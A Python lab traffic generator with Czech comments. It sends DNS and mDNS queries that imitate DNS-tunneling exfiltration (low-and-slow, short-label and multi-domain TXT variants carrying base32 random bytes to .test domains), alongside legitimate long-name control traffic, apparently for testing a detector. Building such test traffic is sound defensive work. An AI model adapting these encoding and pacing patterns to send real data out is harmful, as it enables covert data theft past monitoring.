"""Generátor DNS provozu laboratoře B: atypické exfiltrační varianty a kontroly s dlouhými jmény.

Posílá skutečné DNS dotazy (UDP) na lab resolver 10.88.0.53, nebo mDNS na 224.0.0.251:5353.
Data exfiltrace jsou z os.urandom v base32 (nic skutečného neopouští lab). Tempo a parametry
určuje SEED v předem daném rozsahu (impl-krok17.md, dodatek D1).

Použití: python3 dnsgen.py <režim> <délka_s>
"""
import base64
import os
import random
import socket
import struct
import sys
import time

RESOLVER = ("10.88.0.53", 53)
TYPES = {"A": 1, "CNAME": 5, "PTR": 12, "MX": 15, "TXT": 16, "AAAA": 28, "SRV": 33, "HTTPS": 65}
rng = random.Random(int(os.environ.get("SEED", "0")) * 7919 + sum(sys.argv[1].encode()))


def query(sock, name, qtype, dst=RESOLVER, rd=True):
    qid = rng.randrange(65536)
    flags = 0x0100 if rd else 0
    q = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".") if p) + b"\x00"
    pkt = struct.pack(">HHHHHH", qid, flags, 1, 0, 0, 0) + q + struct.pack(">HH", TYPES[qtype], 1)
    sock.sendto(pkt, dst)
    try:
        sock.recvfrom(4096)
    except OSError:
        pass


def chunk(n):
    return base64.b32encode(os.urandom(n)).decode().rstrip("=").lower()


def hexs(n):
    return os.urandom(n).hex()


def main():
    mode, dur = sys.argv[1], float(sys.argv[2])
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.5)
    end = time.time() + dur
    seq = 0
    if mode == "exfil-slow":
        # low-and-slow: 1 dotaz za 5 až 10 s, značka 52 znaků (32 B dat), typ A
        while time.time() < end:
            query(s, f"{chunk(32)}.{seq % 1000}.slow.test", "A")
            seq += 1
            time.sleep(rng.uniform(5.0, 10.0))
    elif mode == "exfil-short":
        # krátké značky: 12 znaků base32 (7,5 B dat na dotaz), typ A, kolem 4 dotazů/s
        rate = rng.uniform(3.5, 4.5)
        while time.time() < end:
            query(s, f"{chunk(8)[:12]}.s1.test", "A")
            time.sleep(1.0 / rate)
    elif mode == "exfil-multi":
        # více domén: značka 52 znaků, TXT, střídání x1.test až x6.test, kolem 6 dotazů/s
        rate = rng.uniform(5.0, 7.0)
        while time.time() < end:
            query(s, f"{chunk(32)}.x{seq % 6 + 1}.test", "TXT")
            seq += 1
            time.sleep(1.0 / rate)
    elif mode in ("control-av", "control-avburst"):
        # AV reputace (tvar Sophos/McAfee): hash souboru 40 hex + 8 hex, typ A
        rate = rng.uniform(1.8, 2.2) if mode == "control-av" else rng.uniform(9.0, 11.0)
        while time.time() < end:
            query(s, f"{hexs(20)}.{hexs(4)}.avqs.test", "A")
            time.sleep(1.0 / rate)
    elif mode == "control-names":
        # legitimní dlouhá a „divná“ jména: CDN, DNSBL, PTR, DKIM/SPF/DMARC, SRV služby AD
        cdn = [f"d{hexs(7)}.cloudfront.cdn.test" for _ in range(25)] + \
              [f"e{rng.randrange(1000, 9999)}.dsce{rng.randrange(1, 30)}.akamaiedge.cdn.test" for _ in range(25)] + \
              [f"ec2-10-88-{rng.randrange(256)}-{rng.randrange(256)}.eu-central-1.compute.cdn.test" for _ in range(20)]
        fixed = [("selector1._domainkey.lab.test", "TXT"), ("selector2._domainkey.lab.test", "TXT"),
                 ("google._domainkey.lab.test", "TXT"), ("_spf.lab.test", "TXT"), ("_dmarc.lab.test", "TXT"),
                 ("lab.test", "TXT"), ("_ldap._tcp.dc._msdcs.lab.test", "SRV"),
                 ("_kerberos._tcp.dc._msdcs.lab.test", "SRV"),
                 ("_ldap._tcp.default-first-site-name._sites.dc._msdcs.lab.test", "SRV"),
                 ("_gc._tcp.lab.test", "SRV"), ("_kpasswd._udp.lab.test", "SRV")]
        while time.time() < end:
            for _ in range(3):
                n = rng.choice(cdn)
                query(s, n, "A")
                query(s, n, "AAAA")
                query(s, n, "HTTPS")
            ip = f"{rng.randrange(1, 255)}.{rng.randrange(256)}.{rng.randrange(256)}.10"
            query(s, f"{'.'.join(reversed(ip.split('.')))}.zen.bl.test", "A")
            query(s, f"{rng.randrange(1, 121)}.{rng.randrange(2)}.88.10.in-addr.arpa", "PTR")
            n, t = rng.choice(fixed)
            query(s, n, t)
            time.sleep(rng.uniform(0.3, 0.7))
    elif mode == "control-mdns":
        # mDNS: hledání služeb a instance Chromecast s 32znakovým UUID (PTR/SRV/TXT), link-local
        m = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        m.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
        m.settimeout(0.05)
        dst = ("224.0.0.251", 5353)
        inst = [f"Chromecast-{hexs(16)}._googlecast._tcp.local" for _ in range(12)] + \
               [f"Living-Room-{hexs(6)}._airplay._tcp.local" for _ in range(6)] + \
               [f"HP-LaserJet-{hexs(3)}._ipp._tcp.local" for _ in range(4)]
        svc = ["_services._dns-sd._udp.local", "_googlecast._tcp.local", "_airplay._tcp.local",
               "_ipp._tcp.local", "_spotify-connect._tcp.local"]
        while time.time() < end:
            for n in svc:
                query(m, n, "PTR", dst, rd=False)
            for n in inst:
                query(m, n, rng.choice(["SRV", "TXT"]), dst, rd=False)
            time.sleep(rng.uniform(4.0, 6.0))
    else:
        sys.exit(f"neznámý režim {mode}")


if __name__ == "__main__":
    main()
